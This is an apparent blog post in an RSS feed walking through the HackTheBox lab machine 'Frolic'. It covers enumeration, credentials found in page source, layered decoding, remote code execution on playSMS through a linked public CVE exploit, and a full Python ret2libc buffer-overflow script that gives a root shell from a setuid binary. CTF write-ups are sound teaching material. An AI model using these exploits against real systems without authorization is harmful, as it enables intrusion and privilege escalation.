&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/desc.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hey guys! In this post I will be showing how I solved the machine “Frolic” from HackTheBox.&lt;/p&gt;

&lt;p&gt;It was a pretty ctf like machine, and well… I love ctfs, so that turned out to be really fun, specially priv esc part.&lt;/p&gt;

&lt;p&gt;I’ll be posting the links where I got some references on how to proceed when I got a bit stucked.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s start with our standard nmap scan:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;nmap -sV -sC -v 10.10.10.111
# Nmap 7.60 scan initiated Sat Mar 16 08:43:07 2019 as: nmap -sV -sC -v -o frolic 10.10.10.111
Nmap scan report for 10.10.10.111
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (EdDSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
| nbstat: NetBIOS name: FROLIC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| Names:
|   FROLIC&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   FROLIC&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   FROLIC&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2019-03-16T17:13:43+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-16 08:43:43
|_  start_date: 1600-12-31 21:26:00
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 16 08:43:49 2019 -- 1 IP address (1 host up) scanned in 42.33 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can spot four different services running on this box, three of them are useless for us, so let’s focus on the service running on port 9999, a web service.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example1.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are presented with the default nginx page, brute forcing some directories we find the /admin page.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example2.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A log in page, we must find some credentials. Looking in the source code of the js file, we find this.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code1.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great, we got our user and pass. Let’s check the success.html page.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;user = admin
password = superduperlooperpassword_lol&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example3.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What the heck is this?? 😐&lt;/p&gt;

&lt;p&gt;After some searching on esoteric languages I found this “Ook!?” Programming language and a website that could decode it.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example4.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It tells us to check another directory so off we go.&lt;/p&gt;

&lt;p&gt;Reaching this dir we find this&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It appears to be a base64 encoded message, so when I decoded it show a PK… among other random bytes.So this is a zip file.&lt;/p&gt;

&lt;p&gt;When I tried the unzip It asks for a password. I just brute forced it and the password found as was “password”, how cool xd.&lt;/p&gt;

&lt;p&gt;Moving on, the file inside called “index.php” shows:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;obviously some hex code&lt;/p&gt;

&lt;p&gt;decoding it we get another b64 and after that we find this&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;+++++ +++++ [-&amp;gt;++ +++++ +++&amp;lt;] &amp;gt;++++ +.--- --.++ +++++ .&amp;lt;+++ [-&amp;gt;++ +&amp;lt;]&amp;gt;+++.&amp;lt;+ ++[-&amp;gt; ---&amp;lt;] &amp;gt;---- --.-- ----- .&amp;lt;+++ +[-&amp;gt;+ +++&amp;lt;] &amp;gt;+++. &amp;lt;+++[ -&amp;gt;---&amp;lt;]&amp;gt;-- .&amp;lt;+++ [-&amp;gt;++ +&amp;lt;]&amp;gt;+ .---. &amp;lt;+++[ -&amp;gt;--- &amp;lt;]&amp;gt;-- ----. &amp;lt;++++ [-&amp;gt;++ ++&amp;lt;]&amp;gt;++..&amp;lt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s clearly a brain f*ck code. Let’s see what is says&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example5.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, we got something that looks like a password, but password for what? 😿&lt;/p&gt;

&lt;p&gt;Let’s go back to our enumeration phase and start over, we must have missed something.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example6.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;The backup gives us some creds, but it is a rabbit hole :(
the test page gives us php info. nothing useful.
dev page a 403 error.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Awesome, after some more enumeration we got nothing xd&lt;/p&gt;

&lt;p&gt;Let’s keep trying&lt;/p&gt;

&lt;p&gt;Looking into dev/ folder we have another backup.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code2.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there we have a /playsms folder, finally something to use ours creds on.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example7.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To get our reverse shell I found this great exploit on github.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example8.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://github.com/jasperla/CVE-2017-9101&quot; class=&quot;btn btn-blue&quot;&gt;CLICK TO ACCESS GITHUB- jasperla&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code3.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sweet! We got rce.&lt;/p&gt;

&lt;p&gt;Since this is a pretty bad shell I got a new one using php and netcat. But I’ll just skip this part xd&lt;/p&gt;

&lt;p&gt;After getting a better shell, just went to the user home dir and found user.txt xd.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code4.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now the root part!&lt;/p&gt;

&lt;p&gt;Searching the home directory of ayush, we find a .binary dir.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code5.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We find a “rop” binary. Notice its permissions, any user can execute it and do it as root because the sticky bit is set.So if we invoke a shell using this binary we get root, let’s try.&lt;/p&gt;

&lt;p&gt;&lt;i&gt;In this post I’ll not be explaining how a buffer overflow occurs or how to exploit it in details. I’m just gonna explain some thoughts that I had during the exploitation.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;The binary simply runs with an argument the we pass and spits it back out for us, nothing interesting, however if we send a lot of bytes to it, it breaks.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code6.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, we can overwrite EIP but return where?&lt;/p&gt;

&lt;p&gt;The name of the binary already gives us a pretty good hint on what to do, let’s use a technique called “Return to libc” that is a type of ROP.&lt;/p&gt;

&lt;p&gt;&lt;i&gt;You can learn more what is ROP here&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;If you wanna know more about Ret2libc those following links helped me a lot.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m17mV24TgwY&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example9.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://galvanizedsecurity.com/ret2libc/&quot; class=&quot;btn btn-blue&quot;&gt;CLICK TO ACCESS RET2LIBC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So basically we need 5 things to succeed.&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;The offset to overwrite EIP&lt;/li&gt;
	&lt;li&gt;libc base address&lt;/li&gt;
	&lt;li&gt;system call offset&lt;/li&gt;
	&lt;li&gt;exit call offset (optional)&lt;/li&gt;
	&lt;li&gt;string “/bin/bash”&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Lets do one by one:&lt;/p&gt;

&lt;p&gt;To get the offset to overwrite eip I used that pretty standard technique with pattern_create, and got a number of 52.&lt;/p&gt;

&lt;p&gt;To get libc base address we use ldd and grep for libc.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code7.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;i&gt;Note: ASLR is turned off in this box, so lucky for us we don’t need to bypass it.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;Now we need system call offset for libc we do&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code8.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Same thing for exit function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code9.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now the last thing we need is to find “/bin/sh” string, we do.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code10.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sweet, we got everything we need. Let’s chain all together with some python code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb7e19000&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0003ada0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exit_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0002e9d0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;base_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0015ba0b&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_base_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_base_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So running this:&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code11.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we get our root shell!&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code12.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Sat, 23 Mar 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/Frolic-hackthebox-walkthrough/</link>
        <guid isPermaLink="true">http://localhost:4000/Frolic-hackthebox-walkthrough/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
  </channel>
</rss>
